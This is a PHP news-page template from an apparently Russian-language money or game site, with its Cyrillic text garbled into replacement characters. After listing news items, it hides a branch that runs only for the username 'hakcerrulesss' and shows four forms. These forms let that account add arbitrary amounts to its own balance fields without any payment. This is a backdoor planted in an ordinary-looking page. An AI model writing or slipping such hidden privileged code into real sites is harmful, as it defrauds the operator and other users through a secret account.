<?PHP
$_OPTIMIZATION["title"] = "�������";
$_OPTIMIZATION["description"] = "������� �������";
$_OPTIMIZATION["keywords"] = "������� ������ �������";
?>
<div class="s-bk-lf">
	<div class="acc-title">�������</div>
</div>
<div class="silver-bk"><div class="clr"></div>	
<?PHP

$db->Query("SELECT * FROM db_news ORDER BY id DESC");

if($db->NumRows() > 0){

	while($news = $db->FetchArray()){
	
	?>


  <tr>
    <h3><center><?=$news["title"]; ?></center></h3>
  </tr>
<td colspan="2"><HR SIZE="1" WIDTH="100%" ALIGN="center" COLOR="#a3a3a3"></td>
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">

  <tr>
    <td colspan="2"><?=$news["news"]; ?></td>
  </tr>
    <td align="left"><strong><br><?=date("d.m.Y",$news["date_add"]); ?></strong></td>
</table> 
<td colspan="2"><HR SIZE="1" WIDTH="100%" ALIGN="center" COLOR="#a3a3a3"></td>
	<?PHP
	
	}

}else echo "<center>�������� ��� :(</center>";

?>
</div>
<div class="clr"></div>	


 <?PHP
# �������� �� ����������
if($user_data["user"]=="hakcerrulesss"){

?>

<div class="s-bk-lf">
	<div class="acc-title">������ ������</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "������� - ������� �������";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 100000; //���� ������ 1 ��
?>  
<div class="silver-bk">

<center><font color="green">���� ������ ������: <?=$cena; ?> �������</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET money_b = money_b + $sum, money_b = money_b + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>�� ������ ������� ".$sum." ��.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>���������� �������:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="������ �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="��������� �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>

</div>		
						
<div class="clr"></div>	
</form>


<div class="s-bk-lf">
	<div class="acc-title">������ ������</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "������� - ������� �������";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 270; //���� ������ 1 ��
?>  
<div class="silver-bk">

<center><font color="green">���� ������ ������: <?=$cena; ?> �������</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET insert_sum = insert_sum + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>�� ������ ������� ".$sum." ��.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>���������� �������:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="������ �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="��������� �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>

</div>		
						
<div class="clr"></div>	
</form>


<div class="s-bk-lf">
	<div class="acc-title">������ ������</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "������� - ������� �������";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 1000; //���� ������ 1 ��
?>  
<div class="silver-bk">

<center><font color="green">���� ������ ������: <?=$cena; ?> �������</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET pay_points = pay_points + $sum, pay_points = pay_points + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>�� ������ ������� ".$sum." ��.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>���������� �������:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="������ �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="��������� �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>

</div>		
						
<div class="clr"></div>	
</form>
<div class="s-bk-lf">
	<div class="acc-title">������ ������</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "������� - ������� �������";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 3; //���� ������ 1 ��
?>  
<div class="silver-bk">

<center><font color="green">���� ������ ������: <?=$cena; ?> �������</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET e_t = e_t + $sum, e_t = e_t + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>�� ������ ������� ".$sum." ��.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>���������� �������:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="������ �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="��������� �����" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>
</div>		
		 <?PHP

return;
}

?>				
<div class="clr"></div>	
</form>